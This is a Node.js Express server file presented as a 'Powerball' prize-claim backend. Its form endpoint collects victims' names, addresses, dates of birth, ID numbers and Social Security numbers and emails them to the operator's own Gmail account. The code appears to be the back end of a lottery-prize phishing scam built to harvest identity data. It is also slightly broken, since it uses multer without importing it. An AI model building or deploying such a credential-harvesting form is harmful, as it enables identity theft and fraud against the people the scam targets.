const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
require("dotenv").config();
const PORT = process.env.PORT || 3000;

const app = express();

/// Middleware
app.use(cors());
app.use(express.static("public"));
app.use(express.json());

// Root route
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/public/index.html");
});

// Test route
app.get("/home", (req, res) => {
  res.status(200).json("Powerball Backend Server is Running on Vercel!");
});
// Configure multer for handling form data
const upload = multer();



// Email transporter setup
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Test email configuration
transporter.verify(function (error, success) {
  if (error) {
    console.log("Email server error:", error);
  } else {
    console.log("Email server is ready");
  }
});

// Handle form submission
app.post("/send-email", upload.none(), async (req, res) => {
  try {
    console.log("Received form data:", req.body);

    const {
      firstName,
      lastName,
      email,
      phone,
      dob,
      gender,
      street,
      city,
      state,
      zipCode,
      country,
      maritalStatus,
      occupation,
      idType,
      idNumber,
      ssn
    } = req.body;

    // Email content
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: "New Prize Claim Form Submission",
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #1a5f7a;">New Prize Claim Submission</h2>
          <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
            <h3 style="color: #2d3436;">Personal Information</h3>
            <p><strong>Name:</strong> ${firstName} ${lastName}</p>
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Phone:</strong> ${phone}</p>
            <p><strong>Date of Birth:</strong> ${dob}</p>
            <p><strong>Gender:</strong> ${gender}</p>
            
            <h3 style="color: #2d3436; margin-top: 20px;">Address Information</h3>
            <p><strong>Street Address:</strong> ${street}</p>
            <p><strong>City:</strong> ${city}</p>
            <p><strong>State:</strong> ${state}</p>
            <p><strong>ZIP Code:</strong> ${zipCode}</p>
            <p><strong>Country:</strong> ${country}</p>

            <h3 style="color: #2d3436; margin-top: 20px;">Additional Information</h3>
            <p><strong>Marital Status:</strong> ${maritalStatus}</p>
            <p><strong>Occupation:</strong> ${occupation}</p>
            <p><strong>ID Type:</strong> ${idType}</p>
            <p><strong>ID Number:</strong> ${idNumber}</p>
            <p><strong>SSN:</strong> ${ssn}</p>
          </div>
        </div>
      `
    };

    // Send email
    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully");

    res.status(200).json({
      success: true,
      message: "Your prize claim form has been submitted successfully."
    });
  } catch (error) {
    console.error("Server Error:", error);
    res.status(500).json({
      success: false,
      message: "Unable to submit your form. Please try again later.",
      error: error.message
    });
  }
});

app.listen(PORT, () => console.log(`Server ready on port ${PORT}.`));

module.exports = app;
